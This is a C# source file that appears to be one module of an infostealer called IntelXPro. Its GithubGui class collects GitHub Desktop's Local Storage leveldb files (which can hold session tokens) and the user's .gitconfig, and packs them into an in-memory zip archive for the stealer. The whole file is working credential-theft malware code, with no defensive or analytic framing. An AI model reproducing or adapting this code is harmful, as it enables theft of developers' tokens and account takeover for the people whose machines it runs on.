using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class GithubGui : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\GitHub Desktop\\Local Storage\\leveldb\\";
            if (!Directory.Exists(path))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "GithubGui";
            string[] allowedExtensions = new string[2] { ".log", ".ldb" };
            Parallel.ForEach(Directory.GetFiles(path), delegate (string file)
            {
                if (allowedExtensions.Contains(Path.GetExtension(file)))
                {
                    string text3 = "GithubGui\\leveldb\\" + Path.GetFileName(file);
                    zip.AddFile(text3, File.ReadAllBytes(file));
                    counterApplications.Files.Add(file + " => " + text3);
                }
            });
            string text = "C:\\Users\\" + Environment.UserName + "\\.gitconfig";
            if (File.Exists(text))
            {
                string text2 = "GithubGui\\.gitconfig";
                zip.AddFile(text2, File.ReadAllBytes(text));
                counterApplications.Files.Add(text + " => " + text2);
            }
            if (counterApplications.Files.Count() > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
